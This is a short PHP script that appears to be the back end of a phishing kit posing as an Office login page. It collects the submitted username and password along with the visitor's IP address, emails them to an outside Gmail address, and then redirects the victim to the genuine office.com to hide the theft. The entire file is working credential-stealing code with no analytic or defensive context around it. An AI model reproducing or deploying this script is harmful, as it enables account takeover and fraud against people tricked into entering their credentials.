<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Office Tare_ama || :------\n";
$message .= "user: ".$_POST['user']."\n";
$message .= "Pass: ".$_POST['pass']."\n";
$message .= "----: || Tare_ama || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="ceo.inbox1@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://office.com/");
?>